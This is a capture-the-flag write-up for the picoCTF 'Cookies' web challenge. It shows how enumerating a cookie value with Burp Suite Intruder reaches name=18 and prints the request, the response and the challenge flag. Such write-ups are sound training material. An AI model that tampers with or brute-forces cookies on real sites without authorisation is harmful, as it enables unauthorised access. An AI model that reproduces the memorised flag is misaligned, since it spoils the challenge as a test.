# Cookies

### Desccription :
Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:27177/

## Solution

As the name is 'Cookies', we can say that this is something about cookies.

when we enter some cookies name in input fild given it response something like ' I love COOKIE NAME cookies! '. we can not guess the currect cookie name, what we can do is we can change cookies value.

this website store cookies with value ' name:1 ' 

now we can change the value of that cookies ' name:1 ' manually like name:1, name:2, name:3 ..... and so on, or we can use burpsuit intruder for brutforcing this.

i use burpsuit intruder for this, in intruder set '1' as payload in ' name:1 ' and start attack. 

we can see that flag is in cookie ' name:18 '

```req
GET /check HTTP/1.1

Host: mercury.picoctf.net:27177

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://mercury.picoctf.net:27177/

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: name=18

Connection: keep-alive
```

<details>
<summary markdown="span">Click to see Response : </summary>

```

HTTP/1.1 200 OK

Content-Type: text/html; charset=utf-8

Content-Length: 1184

<!DOCTYPE html>
<html lang="en">

<head>
    <title>Cookies</title>

    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Cookies</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_064663be}</code></p>
        </div>

        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
</body>

</html>

```

</details>

#### flag :   picoCTF{3v3ry1_l0v3s_c00k135_064663be}